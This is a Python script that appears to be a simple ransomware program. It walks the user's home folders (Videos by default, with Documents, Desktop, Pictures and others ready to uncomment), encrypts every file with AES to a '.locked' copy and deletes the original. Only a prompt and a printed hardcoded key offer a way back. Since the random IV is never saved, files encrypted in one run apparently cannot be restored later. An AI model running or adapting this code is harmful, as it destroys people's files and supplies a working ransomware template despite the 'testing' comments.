from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os


class AES:
    def __init__(self):
        # you would never use a key like this. It's for testing only
        # AES requires key size of only 128, 192, or 256 bits
        # so a single character is 8 bits. 8 bits X 16 = 128 bits
        self.key = b"a" * 16
        self.backend = default_backend()
        self.iv = os.urandom(16)
        self.cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=self.backend)
        # you don't have to use this as a block size. The point of this is when you are running
        # the encryption you are keeping a small amount of the file in RAM at a time. Probably
        # not a good idea to read a 4 gigabyte movie file in RAM right?
        self.block_size = 65536

    def encrypt(self, filepath):
        # AES
        # * Designed to encrypt/decrypt in 16-byte blocks
        # * If the file is not a multiple of 16, padding needs to be added
        #   to the file. This padding is any character(ex: A, #, 4, etc..) appended to the file
        #   to make it a multiple of 16. 
        encryptor = self.cipher.encryptor()
        new_filepath = filepath + ".locked"
        with open(filepath, "rb") as file, open(new_filepath, "wb") as encrypted_file:
            while(True):
                block = file.read(self.block_size)
                if(len(block) == 0):
                    break   
                elif(len(block) % 16 != 0):
                    block = block + b" " * (16 - (len(block) % 16))
                encrypted_file.write(encryptor.update(block))
        os.remove(filepath)

    def decrypt(self, filepath):
        decryptor = self.cipher.decryptor()
        new_filepath = filepath.strip(".locked")
        with open(filepath, "rb") as encrypted_file, open(new_filepath, "wb") as file:
            while(True):
                block = encrypted_file.read(self.block_size)
                if (len(block) == 0):
                    break
                file.write(decryptor.update(block))
        os.remove(filepath)
        
        
def victim_files(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            yield ("{}/{}".format(root, file))      


def main():
    # uncomment any of the paths where you wish to have files encrypted.
    # By default I have windows 10 paths. You can change it to whatever you want
    userhome = os.path.expanduser("~")
    pathlist = [
        # userhome + "\\Documents\\",
        # userhome + "\\Downloads\\", 
        # userhome + "\\Desktop\\",  
        # userhome + "\\Favorites\\", 
        # userhome + "\\Links\\",
        # userhome + "\\Music\\",
        # userhome + "\\Pictures\\",
        userhome + "\\Videos\\",
    ]
    
    aes = AES()
    for path in pathlist: 
        for file in victim_files(path):
            aes.encrypt(file)
    
    # If you want your files back. Once again for testing.
    answer = input("Do you want your files back? enter 'yes' or 'no':  ")
    if(answer == "yes"):
        for path in pathlist:
            for file in victim_files(path):
                aes.decrypt(file)
    else:
        print("If you want to recover these files later use the password aaaaaaaaaaaaaaaa")
        print("Of course this is if you didn't change the password")
        
        
if(__name__ == "__main__"):
    main()
    
